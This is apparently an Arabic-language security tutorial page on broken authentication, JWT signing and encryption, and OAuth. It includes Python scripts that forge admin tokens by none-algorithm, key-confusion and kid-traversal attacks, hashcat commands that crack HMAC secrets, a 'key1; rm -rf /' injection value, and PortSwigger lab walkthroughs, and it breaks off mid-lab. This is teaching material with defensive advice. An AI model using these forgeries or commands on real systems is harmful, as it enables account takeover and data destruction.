                <h4><i class="fas fa-lightbulb"></i> نصائح لاكتشاف Broken Authentication</h4>
                <ul class="list">
                    <li><strong>🔍 ابحث عن:</strong> صفحات login، register، forgot password، change password</li>
                    <li><strong>🧪 اختبر:</strong> كلمات مرور ضعيفة، brute force، session hijacking</li>
                    <li><strong>⚠️ راقب:</strong> رسائل الخطأ المختلفة، redirect behavior، cookie values</li>
                    <li><strong>🛠️ استخدم:</strong> Burp Suite، OWASP ZAP، custom scripts</li>
                </ul>
            </div>
        </section>

        <section id="jwt-basics">
            <h2><i class="fas fa-shield-alt"></i> مقدمة JWT: التوقيع (JWS) مقابل التشفير (JWE)</h2>
            
            <p>JSON Web Tokens (JWT) هي معيار مفتوح (RFC 7519) لنقل المعلومات بشكل آمن بين الأطراف. يتكون JWT من ثلاثة أجزاء مفصولة بنقاط، كل جزء مُرمز بـ Base64URL.</p>

            <h3>🔍 بنية JWT الأساسية</h3>
            <div class="code-block">
// بنية JWT الأساسية
JWT = header.payload.signature

// مثال JWT حقيقي
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c
            </div>

            <div class="mermaid">
graph TD
    A[JWT Token] --> B[Header<br/>eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9]
    A --> C[Payload<br/>eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ]
    A --> D[Signature<br/>SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c]
    
    B --> B1[{"alg": "HS256",<br/>"typ": "JWT"}]
    C --> C1[{"sub": "1234567890",<br/>"name": "John Doe",<br/>"iat": 1516239022}]
    D --> D1[HMACSHA256(<br/>base64UrlEncode(header) + "." +<br/>base64UrlEncode(payload),<br/>secret)]
            </div>

            <div class="grid">
                <div class="card">
                    <h3>🏷️ Header (الرأس)</h3>
                    <p>يحتوي على نوع الرمز والخوارزمية المستخدمة:</p>
                    <div class="code-block">
{
  "alg": "HS256",  // الخوارزمية المستخدمة
  "typ": "JWT"     // نوع الرمز
}
                    </div>
                </div>
                <div class="card">
                    <h3>📦 Payload (الحمولة)</h3>
                    <p>يحتوي على البيانات (Claims) المراد نقلها:</p>
                    <div class="code-block">
{
  "sub": "1234567890",    // Subject
  "name": "John Doe",     // Custom claim
  "iat": 1516239022,      // Issued at
  "exp": 1516242622       // Expiration
}
                    </div>
                </div>
                <div class="card">
                    <h3>✍️ Signature (التوقيع)</h3>
                    <p>يضمن سلامة البيانات وعدم تعديلها:</p>
                    <div class="code-block">
HMACSHA256(
  base64UrlEncode(header) + "." +
  base64UrlEncode(payload),
  secret
)
                    </div>
                </div>
            </div>

            <h3>🔐 JWS مقابل JWE: الفرق الأساسي</h3>
            
            <div class="grid">
                <div class="card">
                    <h4>🖊️ JWS (JSON Web Signature)</h4>
                    <p><strong>الغرض:</strong> ضمان سلامة البيانات (Integrity) والتحقق من المصدر (Authentication)</p>
                    <p><strong>البيانات:</strong> مرئية (Base64URL فقط، ليس تشفير حقيقي)</p>
                    <p><strong>الحماية:</strong> التوقيع الرقمي يمنع التعديل</p>
                    
                    <div class="warn">
                        <strong>تحذير:</strong> البيانات في JWS مرئية لأي شخص يمكنه فك تشفير Base64URL!
                    </div>
                </div>
                
                <div class="card">
                    <h4>🔒 JWE (JSON Web Encryption)</h4>
                    <p><strong>الغرض:</strong> ضمان السرية (Confidentiality) والسلامة معاً</p>
                    <p><strong>البيانات:</strong> مشفرة بالكامل ولا يمكن قراءتها</p>
                    <p><strong>الحماية:</strong> التشفير + المصادقة</p>
                    
                    <div class="tip">
                        <strong>نصيحة:</strong> استخدم JWE عندما تحتاج لإخفاء محتوى البيانات الحساسة
                    </div>
                </div>
            </div>

                        <h3>🔧 خوارزميات JWS الشائعة - شرح تفصيلي</h3>
            
            <p>قبل فهم هجمات JWT، يجب أن نفهم كيف تعمل خوارزميات التشفير. هناك 3 عائلات رئيسية:</p>

            <div class="attack-demo">
                <h4>🔑 1. HMAC (Hash-based Message Authentication Code)</h4>
                <p><strong>الفكرة:</strong> مفتاح واحد مشترك للتوقيع والتحقق</p>
                
                <div class="mermaid">
graph LR
    A[البيانات: header.payload] --> B[HMAC Function]
    C[المفتاح السري] --> B
    B --> D[التوقيع: hash digest]
    
    E[التحقق] --> F[HMAC Function]
    G[نفس المفتاح السري] --> F
    H[البيانات المستلمة] --> F
    F --> I{هل التوقيع متطابق؟}
    I -->|نعم| J[صحيح ✅]
    I -->|لا| K[مزيف ❌]
    
    style C fill:#81c784
    style G fill:#81c784
    style J fill:#e8f5e8
    style K fill:#ffebee
                </div>
                
                <div class="code-block">
# كيف يعمل HMAC داخلياً:

1. خوارزمية SHA (مثل SHA-256)
2. المفتاح السري (مثل "my-secret-key")
3. البيانات (header.payload)

# الحساب:
HMAC-SHA256(data, secret) = SHA256((secret ⊕ opad) || SHA256((secret ⊕ ipad) || data))

# بشكل مبسط:
signature = HMAC-SHA256("eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ", "my-secret-key")

# النتيجة:
signature = "SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c"
                </div>
                
                <div class="grid">
                    <div class="card">
                        <h4>HS256 (HMAC + SHA-256)</h4>
                        <ul class="list">
                            <li><strong>الطول:</strong> 256-bit signature</li>
                            <li><strong>السرعة:</strong> سريع جداً</li>
                            <li><strong>الأمان:</strong> قوي إذا كان المفتاح قوي</li>
                            <li><strong>الاستخدام:</strong> التطبيقات البسيطة</li>
                        </ul>
                        <div class="code-block">
// Node.js مثال
const crypto = require('crypto');
const secret = 'my-256-bit-secret';
const data = 'header.payload';

const signature = crypto
  .createHmac('sha256', secret)
  .update(data)
  .digest('base64url');
                        </div>
                    </div>
                    
                    <div class="card">
                        <h4>HS384 (HMAC + SHA-384)</h4>
                        <ul class="list">
                            <li><strong>الطول:</strong> 384-bit signature</li>
                            <li><strong>السرعة:</strong> أبطأ قليلاً من HS256</li>
                            <li><strong>الأمان:</strong> أقوى من HS256</li>
                            <li><strong>الاستخدام:</strong> التطبيقات المتوسطة</li>
                        </ul>
                    </div>
                    
                    <div class="card">
                        <h4>HS512 (HMAC + SHA-512)</h4>
                        <ul class="list">
                            <li><strong>الطول:</strong> 512-bit signature</li>
                            <li><strong>السرعة:</strong> الأبطأ في عائلة HMAC</li>
                            <li><strong>الأمان:</strong> الأقوى في عائلة HMAC</li>
                            <li><strong>الاستخدام:</strong> التطبيقات عالية الأمان</li>
                        </ul>
                    </div>
                </div>
                
                <div class="danger">
                    <h4>⚠️ نقاط ضعف HMAC</h4>
                    <ul class="list">
                        <li><strong>مشاركة المفتاح:</strong> يجب أن يعرف الجميع نفس المفتاح</li>
                        <li><strong>إدارة المفاتيح:</strong> صعوبة تدوير المفاتيح</li>
                        <li><strong>المفاتيح الضعيفة:</strong> إذا كان المفتاح ضعيف، يمكن كسره</li>
                        <li><strong>تسريب المفتاح:</strong> إذا تسرب المفتاح، كل شيء مكشوف</li>
                    </ul>
                </div>
            </div>

            <div class="attack-demo">
                <h4>🔐 2. RSA (Rivest-Shamir-Adleman)</h4>
                <p><strong>الفكرة:</strong> مفتاحان مختلفان - خاص للتوقيع، عام للتحقق</p>
                
                <div class="mermaid">
graph TD
    A[إنشاء زوج مفاتيح RSA] --> B[المفتاح الخاص<br/>Private Key]
    A --> C[المفتاح العام<br/>Public Key]
    
    D[البيانات: header.payload] --> E[توقيع بالمفتاح الخاص]
    B --> E
    E --> F[التوقيع الرقمي]
    
    G[التحقق] --> H[فك التوقيع بالمفتاح العام]
    C --> H
    F --> H
    D --> I[hash البيانات]
    H --> J[hash من التوقيع]
    I --> K{هل متطابقان؟}
    J --> K
    K -->|نعم| L[صحيح ✅]
    K -->|لا| M[مزيف ❌]
    
    style B fill:#ff9800
    style C fill:#81c784
    style L fill:#e8f5e8
    style M fill:#ffebee
                </div>
                
                <div class="code-block">
# كيف يعمل RSA:

1. إنشاء المفاتيح:
   - اختيار عددين أوليين كبيرين: p, q
   - حساب n = p × q
   - حساب φ(n) = (p-1)(q-1)
   - اختيار e (عادة 65537)
   - حساب d حيث e × d ≡ 1 (mod φ(n))
   
2. المفتاح العام: (n, e)
3. المفتاح الخاص: (n, d)

4. التوقيع:
   signature = (hash(data))^d mod n

5. التحقق:
   hash_from_signature = signature^e mod n
   if hash_from_signature == hash(data): valid
                </div>
                
                <div class="grid">
                    <div class="card">
                        <h4>RS256 (RSA + SHA-256)</h4>
                        <div class="code-block">
// إنشاء مفاتيح RSA
const crypto = require('crypto');
const { publicKey, privateKey } = crypto.generateKeyPairSync('rsa', {
  modulusLength: 2048,
  publicKeyEncoding: { type: 'spki', format: 'pem' },
  privateKeyEncoding: { type: 'pkcs8', format: 'pem' }
});

// التوقيع
const jwt = require('jsonwebtoken');
const token = jwt.sign({ sub: '123', name: 'Ahmed' }, privateKey, { 
  algorithm: 'RS256',
  keyid: 'key-1'
});

// التحقق
const decoded = jwt.verify(token, publicKey, { algorithms: ['RS256'] });
                        </div>
                    </div>
                    
                    <div class="card">
                        <h4>RS384 & RS512</h4>
                        <ul class="list">
                            <li><strong>RS384:</strong> RSA + SHA-384</li>
                            <li><strong>RS512:</strong> RSA + SHA-512</li>
                            <li><strong>الفرق:</strong> طول hash function</li>
                            <li><strong>الأمان:</strong> RS512 > RS384 > RS256</li>
                        </ul>
                    </div>
                </div>
                
                <div class="tip">
                    <h4>💡 مميزات RSA</h4>
                    <ul class="list">
                        <li><strong>لا حاجة لمشاركة أسرار:</strong> المفتاح العام يمكن نشره</li>
                        <li><strong>إدارة مفاتيح أسهل:</strong> كل طرف له مفاتيحه الخاصة</li>
                        <li><strong>أمان عالي:</strong> صعب كسر المفاتيح الطويلة</li>
                        <li><strong>معيار صناعي:</strong> مستخدم في كل مكان</li>
                    </ul>
                </div>
                
                <div class="warn">
                    <h4>⚠️ عيوب RSA</h4>
                    <ul class="list">
                        <li><strong>بطيء:</strong> أبطأ بكثير من HMAC</li>
                        <li><strong>حجم كبير:</strong> التوقيعات والمفاتيح كبيرة</li>
                        <li><strong>استهلاك طاقة:</strong> يحتاج معالجة أكثر</li>
                        <li><strong>تعقيد التطبيق:</strong> أصعب في التنفيذ</li>
                    </ul>
                </div>
            </div>

            <div class="attack-demo">
                <h4>📐 3. ECDSA (Elliptic Curve Digital Signature Algorithm)</h4>
                <p><strong>الفكرة:</strong> نفس مبدأ RSA لكن باستخدام المنحنيات الإهليلجية</p>
                
                <div class="mermaid">
graph TD
    A[منحنى إهليلجي<br/>y² = x³ + ax + b] --> B[نقطة أساسية G]
    C[مفتاح خاص: d<br/>عدد عشوائي] --> D[مفتاح عام: Q = d × G<br/>نقطة على المنحنى]
    
    E[البيانات] --> F[hash البيانات]
    F --> G[إنشاء k عشوائي]
    G --> H[حساب r = (k × G).x mod n]
    C --> I[حساب s = k⁻¹(hash + r×d) mod n]
    H --> J[التوقيع: (r, s)]
    I --> J
    
    K[التحقق] --> L[حساب u1 = hash × s⁻¹ mod n]
    K --> M[حساب u2 = r × s⁻¹ mod n]
    L --> N[نقطة = u1×G + u2×Q]
    M --> N
    D --> N
    N --> O{هل r == نقطة.x mod n؟}
    O -->|نعم| P[صحيح ✅]
    O -->|لا| Q[مزيف ❌]
    
    style C fill:#ff9800
    style D fill:#81c784
    style P fill:#e8f5e8
    style Q fill:#ffebee
                </div>
                
                <div class="code-block">
# المنحنيات الشائعة:

1. P-256 (secp256r1) - للـ ES256:
   y² = x³ - 3x + b (mod p)
   حيث p = 2²⁵⁶ - 2²²⁴ + 2¹⁹² + 2⁹⁶ - 1

2. P-384 (secp384r1) - للـ ES384:
   مشابه لكن بحجم 384-bit

3. P-521 (secp521r1) - للـ ES512:
   مشابه لكن بحجم 521-bit

# مثال إنشاء مفاتيح ECDSA:
const crypto = require('crypto');
const { publicKey, privateKey } = crypto.generateKeyPairSync('ec', {
  namedCurve: 'secp256k1',  // أو 'prime256v1' للـ P-256
  publicKeyEncoding: { type: 'spki', format: 'pem' },
  privateKeyEncoding: { type: 'pkcs8', format: 'pem' }
});

# التوقيع:
const token = jwt.sign({ sub: '123' }, privateKey, { algorithm: 'ES256' });
                </div>
                
                <div class="grid">
                    <div class="card">
                        <h4>ES256 (ECDSA + P-256 + SHA-256)</h4>
                        <ul class="list">
                            <li><strong>المنحنى:</strong> P-256 (prime256v1)</li>
                            <li><strong>حجم المفتاح:</strong> 256-bit</li>
                            <li><strong>قوة الأمان:</strong> مكافئة لـ RSA 3072-bit</li>
                            <li><strong>السرعة:</strong> أسرع من RSA</li>
                        </ul>
                    </div>
                    
                    <div class="card">
                        <h4>ES384 & ES512</h4>
                        <ul class="list">
                            <li><strong>ES384:</strong> P-384 + SHA-384</li>
                            <li><strong>ES512:</strong> P-521 + SHA-512</li>
                            <li><strong>ملاحظة:</strong> ES512 يستخدم P-521 وليس P-512</li>
                            <li><strong>الأمان:</strong> أقوى تدريجياً</li>
                        </ul>
                    </div>
                </div>
                
                <div class="tip">
                    <h4>🚀 لماذا ECDSA أفضل؟</h4>
                    <ul class="list">
                        <li><strong>مفاتيح أصغر:</strong> 256-bit ECDSA = 3072-bit RSA</li>
                        <li><strong>سرعة أعلى:</strong> توقيع وتحقق أسرع من RSA</li>
                        <li><strong>استهلاك أقل:</strong> ذاكرة وطاقة أقل</li>
                        <li><strong>مستقبلي:</strong> مقاوم للحاسوب الكمي أكثر من RSA</li>
                    </ul>
                </div>
            </div>

            <div class="attack-demo">
                <h4>⚡ مقارنة سريعة بين الخوارزميات</h4>
                
                <div class="mermaid">
graph TD
    A[اختيار خوارزمية JWT] --> B{نوع التطبيق؟}
    
    B -->|تطبيق بسيط<br/>مفتاح واحد| C[HMAC]
    B -->|تطبيق موزع<br/>عدة خدمات| D[RSA أو ECDSA]
    B -->|أداء عالي<br/>موارد محدودة| E[ECDSA]
    
    C --> F[HS256: سريع وبسيط<br/>HS384/512: أمان أعلى]
    D --> G[RSA: معيار قديم موثوق<br/>ECDSA: حديث وأسرع]
    E --> H[ES256: الأكثر شيوعاً<br/>ES384/512: أمان فائق]
    
    style C fill:#81c784
    style G fill:#42a5f5
    style H fill:#ff9800
                </div>
                
                <div class="code-block">
# جدول مقارنة الأداء:

خوارزمية    | حجم المفتاح | سرعة التوقيع | سرعة التحقق | حجم التوقيع | الأمان
-----------|-------------|-------------|-------------|-------------|--------
HS256      | 256-bit     | ⭐⭐⭐⭐⭐      | ⭐⭐⭐⭐⭐      | 256-bit     | ⭐⭐⭐
HS384      | 384-bit     | ⭐⭐⭐⭐       | ⭐⭐⭐⭐       | 384-bit     | ⭐⭐⭐⭐
HS512      | 512-bit     | ⭐⭐⭐⭐       | ⭐⭐⭐⭐       | 512-bit     | ⭐⭐⭐⭐⭐
RS256      | 2048-bit    | ⭐⭐         | ⭐⭐⭐        | 2048-bit    | ⭐⭐⭐⭐
RS384      | 2048-bit    | ⭐⭐         | ⭐⭐⭐        | 2048-bit    | ⭐⭐⭐⭐⭐
RS512      | 2048-bit    | ⭐⭐         | ⭐⭐⭐        | 2048-bit    | ⭐⭐⭐⭐⭐
ES256      | 256-bit     | ⭐⭐⭐⭐       | ⭐⭐⭐⭐       | 512-bit     | ⭐⭐⭐⭐
ES384      | 384-bit     | ⭐⭐⭐        | ⭐⭐⭐        | 768-bit     | ⭐⭐⭐⭐⭐
ES512      | 521-bit     | ⭐⭐⭐        | ⭐⭐⭐        | 1042-bit    | ⭐⭐⭐⭐⭐

# التوصيات:
✅ للتطبيقات البسيطة: HS256
✅ للتطبيقات الموزعة: ES256
✅ للأمان العالي: ES384 أو HS512
✅ للتوافق القديم: RS256
                </div>
            </div>

            <h3>🔐 خوارزميات JWE المتقدمة</h3>
            
            <div class="grid">
                <div class="card">
                    <h4>Key Management Algorithms</h4>
                    <ul class="list">
                        <li><strong>RSA-OAEP:</strong> RSA مع OAEP padding</li>
                        <li><strong>RSA-OAEP-256:</strong> نسخة محسنة بـ SHA-256</li>
                        <li><strong>ECDH-ES:</strong> Elliptic Curve Diffie-Hellman</li>
                        <li><strong>A256KW:</strong> AES Key Wrap</li>
                    </ul>
                </div>
                
                <div class="card">
                    <h4>Content Encryption Algorithms</h4>
                    <ul class="list">
                        <li><strong>A256GCM:</strong> AES-256-GCM (مُوصى به)</li>
                        <li><strong>A128GCM:</strong> AES-128-GCM</li>
                        <li><strong>A256CBC-HS512:</strong> AES-256-CBC + HMAC-SHA512</li>
                    </ul>
                </div>
            </div>

            <div class="tip">
                <h4>💡 متى تستخدم كل نوع؟</h4>
                <ul class="list">
                    <li><strong>JWS:</strong> للتحقق من سلامة البيانات العامة (مثل معلومات المستخدم الأساسية)</li>
                    <li><strong>JWE:</strong> للبيانات الحساسة (مثل كلمات المرور، أرقام البطاقات الائتمانية)</li>
                    <li><strong>JWS + HTTPS:</strong> الحل الأكثر شيوعاً للتطبيقات العادية</li>
                    <li><strong>JWE:</strong> للبيانات الحساسة جداً أو التخزين طويل المدى</li>
                </ul>
            </div>
        </section>

        <section id="jwt-attacks">
            <h2><i class="fas fa-bomb"></i> هجمات JWT (JWS) - الأكثر خطورة وشيوعاً</h2>
            
            <p>JWT يحتوي على عيوب أمنية خطيرة إذا لم يُطبق بشكل صحيح. هذه الهجمات تستغل ضعف التحقق من التوقيع أو سوء إدارة المفاتيح.</p>

            <div class="danger">
                <h4>⚠️ تحذير مهم</h4>
                <p>معظم هجمات JWT تحدث بسبب أخطاء في التطبيق وليس في المعيار نفسه. دائماً تحقق من التوقيع وتحقق من الخوارزمية المستخدمة!</p>
            </div>

            <h3>🚫 هجمة None Algorithm - الأخطر والأسهل</h3>
            
            <div class="attack-demo">
                <h4>🎯 كيف تعمل الهجمة؟</h4>
                <p>المهاجم يغير الخوارزمية إلى "none" ويحذف التوقيع، والخادم الضعيف يقبل الرمز بدون تحقق!</p>
                
                <div class="code-block">
// JWT الأصلي (صحيح)
{
  "alg": "HS256",
  "typ": "JWT"
}
{
  "sub": "user123",
  "role": "user",
  "exp": 1640995200
}
[signature]

// JWT المُخترق (none algorithm)
{
  "alg": "none",    // ← تغيير الخوارزمية
  "typ": "JWT"
}
{
  "sub": "user123",
  "role": "admin",  // ← تغيير الصلاحية!
  "exp": 1940995200 // ← تمديد انتهاء الصلاحية
}
// بدون توقيع!
                </div>
                
                <h4>🛠️ كود الاستغلال العملي</h4>
                <div class="code-block">
import base64
import json

# إنشاء header جديد
header = {
    "alg": "none",
    "typ": "JWT"
}

# تعديل payload لإعطاء صلاحيات admin
payload = {
    "sub": "user123",
    "role": "admin",  # تغيير من user إلى admin
    "iat": 1640995200,
    "exp": 1940995200  # تمديد الصلاحية لسنوات
}

# ترميز Base64URL
header_b64 = base64.urlsafe_b64encode(
    json.dumps(header).encode()
).decode().rstrip('=')

payload_b64 = base64.urlsafe_b64encode(
    json.dumps(payload).encode()
).decode().rstrip('=')

# JWT بدون توقيع
malicious_jwt = f"{header_b64}.{payload_b64}."
print(f"Malicious JWT: {malicious_jwt}")
                </div>
            </div>

            <h3>🔀 Key Confusion Attack - استغلال الخوارزميات المختلطة</h3>
            
            <div class="attack-demo">
                <h4>🎯 المشكلة: RS256 → HS256 Confusion</h4>
                <p>الخادم يستخدم RS256 (مفتاح عام/خاص) لكن المهاجم يخدعه لاستخدام HS256 (مفتاح مشترك) مع المفتاح العام!</p>
                
                <div class="mermaid">
sequenceDiagram
    participant A as المهاجم
    participant S as الخادم
    participant K as JWKS Endpoint
    
    A->>K: GET /.well-known/jwks.json
    K->>A: {"keys": [{"kty": "RSA", "n": "public_key_data"}]}
    
    Note over A: يستخدم المفتاح العام كـ HMAC secret
    A->>A: HMAC-SHA256(data, public_key)
    A->>S: JWT مع alg: "HS256"
    
    Note over S: الخادم يستخدم المفتاح العام كـ HMAC secret
    S->>S: تحقق ناجح! ✓
    S->>A: تم قبول JWT المزيف
                </div>
                
                <h4>🛠️ كود الاستغلال</h4>
                <div class="code-block">
import requests
import jwt
import json
from cryptography.hazmat.primitives import serialization

# 1. تحميل المفتاح العام من JWKS
jwks_url = "https://target.com/.well-known/jwks.json"
jwks = requests.get(jwks_url).json()

# 2. استخراج المفتاح العام
public_key_data = jwks['keys'][0]
# تحويل JWK إلى PEM format
public_key_pem = jwk_to_pem(public_key_data)

# 3. إنشاء payload خبيث
payload = {
    "sub": "victim_user",
    "role": "admin",      # ترقية الصلاحيات
    "iat": 1640995200,
    "exp": 1940995200
}

# 4. توقيع بـ HS256 باستخدام المفتاح العام
malicious_token = jwt.encode(
    payload, 
    public_key_pem,       # المفتاح العام كـ HMAC secret!
    algorithm='HS256'     # تغيير من RS256 إلى HS256
)

print(f"Malicious Token: {malicious_token}")
                </div>
            </div>

            <h3>💉 KID (Key ID) Injection - استغلال معرف المفتاح</h3>
            
            <div class="attack-demo">
                <h4>🎯 العيب: استخدام kid لقراءة الملفات</h4>
                <p>عندما يستخدم الخادم قيمة "kid" من header لتحديد مسار ملف المفتاح، يمكن للمهاجم التلاعب بالمسار!</p>
                
                <div class="code-block">
// Header طبيعي
{
  "alg": "HS256",
  "typ": "JWT",
  "kid": "key1"  // الخادم يقرأ: /keys/key1
}

// Header مُخترق - Path Traversal
{
  "alg": "HS256", 
  "typ": "JWT",
  "kid": "../../../../etc/passwd"  // قراءة ملف النظام!
}

// Header مُخترق - /dev/null
{
  "alg": "HS256",
  "typ": "JWT", 
  "kid": "../../../../dev/null"  // مفتاح فارغ = توقيع فارغ
}

// Header مُخترق - Command Injection
{
  "alg": "HS256",
  "typ": "JWT",
  "kid": "key1; rm -rf /"  // إذا كان يُمرر للـ shell!
}
                </div>
                
                <h4>🛠️ استغلال /dev/null</h4>
                <div class="code-block">
import jwt
import json
import base64

# إنشاء JWT مع kid يشير لـ /dev/null
header = {
    "alg": "HS256",
    "typ": "JWT", 
    "kid": "../../../../dev/null"  # سيقرأ الخادم محتوى فارغ
}

payload = {
    "sub": "attacker",
    "role": "admin",
    "exp": 1940995200
}

# توقيع بمفتاح فارغ (لأن /dev/null فارغ)
empty_key = ""
token = jwt.encode(payload, empty_key, algorithm='HS256', headers=header)
                </div>
            </div>

            <h3>🔓 Weak Secret Attack - كسر المفاتيح الضعيفة</h3>
            
            <div class="attack-demo">
                <h4>🎯 المشكلة: مفاتيح HMAC ضعيفة</h4>
                <p>كثير من المطورين يستخدمون مفاتيح ضعيفة أو افتراضية يمكن كسرها بالقوة الغاشمة!</p>
                
                <div class="code-block">
// أمثلة على مفاتيح ضعيفة شائعة
"secret"
"password" 
"123456"
"jwt_secret"
"your-256-bit-secret"
"mySecretKey"
""  // مفتاح فارغ!
                </div>
                
                <h4>🛠️ كسر JWT بـ Hashcat</h4>
                <div class="code-block">
# حفظ JWT في ملف
echo "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c" > jwt.txt

# كسر بـ Hashcat
hashcat -a 0 -m 16500 jwt.txt /usr/share/wordlists/rockyou.txt

# أو استخدام john
john --wordlist=/usr/share/wordlists/rockyou.txt --format=HMAC-SHA256 jwt.txt

# أو استخدام jwt_tool
python3 jwt_tool.py -C -d /usr/share/wordlists/rockyou.txt jwt.txt
                </div>
                
                <h4>🛠️ إنشاء JWT جديد بعد كسر المفتاح</h4>
                <div class="code-block">
import jwt

# المفتاح الذي تم كسره
cracked_secret = "secret"

# إنشاء payload جديد بصلاحيات admin
admin_payload = {
    "sub": "attacker",
    "role": "admin", 
    "iat": 1640995200,
    "exp": 1940995200
}

# إنشاء JWT جديد
admin_token = jwt.encode(admin_payload, cracked_secret, algorithm='HS256')
print(f"Admin Token: {admin_token}")
                </div>
            </div>

            <div class="tip">
                <h4>🛡️ كيف تحمي نفسك من هجمات JWT؟</h4>
                <ul class="list">
                    <li><strong>رفض "none" تماماً:</strong> لا تقبل alg="none" أبداً</li>
                    <li><strong>تحديد الخوارزميات المسموحة:</strong> whitelist صارم للخوارزميات</li>
                    <li><strong>ربط الخوارزمية بالمفتاح:</strong> منع Key Confusion</li>
                    <li><strong>تنظيف kid:</strong> whitelist أو regex للتحقق من kid</li>
                    <li><strong>مفاتيح قوية:</strong> 256-bit عشوائية للـ HMAC</li>
                    <li><strong>تدوير المفاتيح:</strong> تغيير دوري للمفاتيح</li>
                </ul>
            </div>
        </section>

        <section id="jwe-attacks">
            <h2><i class="fas fa-lock"></i> هجمات JWE (التشفير)</h2>
            <div class="grid">
                <div class="card">
                    <h3>RSA1_5 Padding Oracles</h3>
                    <ul class="list">
                        <li>العيب: استخدام RSA1_5 القديم دون OAEP</li>
                        <li>الاستغلال: فك شفرة تدريجياً عبر ردود الخطأ</li>
                        <li>الحماية: استخدام RSA-OAEP-256 أو ECDH-ES + GCM</li>
                    </ul>
                </div>
                <div class="card">
                    <h3>AES-CBC + HMAC Misuse</h3>
                    <ul class="list">
                        <li>العيب: تحقق سلامة غير صحيح → CBC bit flipping</li>
                        <li>الاستغلال: تعديل المحتوى المشفر</li>
                        <li>الحماية: AEAD مثل A256GCM (مصادَق)</li>
                    </ul>
                </div>
                <div class="card">
                    <h3>KDF/Key Agreement أخطاء</h3>
                    <ul class="list">
                        <li>العيب: اشتقاق مفاتيح ضعيف في ECDH-ES</li>
                        <li>الاستغلال: إعادة استخدام nonces/IVs</li>
                        <li>الحماية: مكتبات موثوقة، إدارة مفاتيح صحيحة</li>
                    </ul>
                </div>
            </div>
        </section>

        <section id="oauth-basics">
            <h2><i class="fab fa-osi"></i> أساسيات OAuth 2.0</h2>
            <div class="grid">
                <div class="card">
                    <h3>الأدوار والتدفقات</h3>
                    <ul class="list">
                        <li>Resource Owner, Client, Authorization Server, Resource Server</li>
                        <li>Authorization Code (+PKCE), Client Credentials, Refresh Token</li>
                    </ul>
                </div>
                <div class="card">
                    <h3>نقاط النهاية</h3>
                    <ul class="list">
                        <li>/authorize, /token, /userinfo, /revocation</li>
                        <li>Scopes, Consent, redirect_uri</li>
                    </ul>
                </div>
            </div>
        </section>

        <section id="oauth-attacks">
            <h2><i class="fas fa-bug"></i> هجمات OAuth الشائعة</h2>
            <div class="grid">
                <div class="card">
                    <h3>تلاعب redirect_uri</h3>
                    <ul class="list">
                        <li>Open Redirect → سرقة Authorization Code</li>
                        <li>عدم التطابق الدقيق Exact match</li>
                    </ul>
                </div>
                <div class="card">
                    <h3>تسريب الرموز</h3>
                    <ul class="list">
                        <li>Token Leak عبر Referer/Logs</li>
                        <li>إرسال Tokens للعميل بدون TLS</li>
                    </ul>
                </div>
                <div class="card">
                    <h3>هجمات PKCE</h3>
                    <ul class="list">
                        <li>Code Reuse، ضعف code_verifier</li>
                        <li>إعادة استخدام Authorization Code</li>
                    </ul>
                </div>
                <div class="card">
                    <h3>ثغرات ربط الجلسات</h3>
                    <ul class="list">
                        <li>Account Linking بدون تحقق ملكية</li>
                        <li>Mix-Up Attack بين مزودي OAuth</li>
                    </ul>
                </div>
            </div>
        </section>

        <section id="labs">
            <h2><i class="fas fa-flask"></i> مختبرات عملية (15) - PortSwigger Academy</h2>
            
            <p>مختبرات متدرجة الصعوبة من PortSwigger Academy لتطبيق ما تعلمته عملياً. كل مختبر يحتوي على خطوات مفصلة ونصائح للحل.</p>

            <h3>🔓 مختبرات Authentication</h3>
            
            <div class="lab-card">
                <h4>🧪 Lab 1: Username enumeration via different responses</h4>
                <p><strong>الهدف:</strong> اكتشاف أسماء المستخدمين الصحيحة من خلال اختلاف الردود</p>
                <p><strong>التقنية:</strong> تحليل رسائل الخطأ المختلفة بين "Invalid username" و "Invalid password"</p>
                <div class="code-block">
# خطوات الحل:
1. استخدم Burp Intruder لتجربة قائمة usernames
2. ابحث عن اختلاف في response length أو error message
3. استخدم username الصحيح مع password list
4. سجل دخول بالبيانات الصحيحة
                </div>
                <a href="https://portswigger.net/web-security/authentication/password-based/lab-username-enumeration-via-different-responses" class="lab-link" target="_blank">
                    <i class="fas fa-external-link-alt"></i> فتح المختبر
                </a>
            </div>

            <div class="lab-card">
                <h4>🧪 Lab 2: 2FA broken logic</h4>
                <p><strong>الهدف:</strong> تجاوز المصادقة الثنائية عبر استغلال منطق معيب</p>
                <p><strong>التقنية:</strong> تغيير معرف المستخدم في cookie لتجاوز 2FA للضحية</p>
                <div class="code-block">
# خطوات الحل:
1. سجل دخول بحسابك وفعّل 2FA
2. اعترض طلب /login2 وغيّر verify parameter للضحية
3. أرسل طلب GET /login2 مع cookie للضحية
4. استخدم Brute Force على 4-digit 2FA code
5. سجل دخول كالضحية
                </div>
                <a href="https://portswigger.net/web-security/authentication/multi-factor/lab-2fa-broken-logic" class="lab-link" target="_blank">
                    <i class="fas fa-external-link-alt"></i> فتح المختبر
                </a>
            </div>

            <div class="lab-card">
                <h4>🧪 Lab 3: Password reset broken logic</h4>
                <p><strong>الهدف:</strong> استغلال عيب في منطق إعادة تعيين كلمة المرور</p>
                <p><strong>التقنية:</strong> تغيير username parameter في طلب reset لاستهداف ضحية أخرى</p>
                <div class="code-block">
# خطوات الحل:
1. ابدأ password reset لحسابك
2. اعترض طلب POST /forgot-password
3. غيّر username parameter للضحية (carlos)
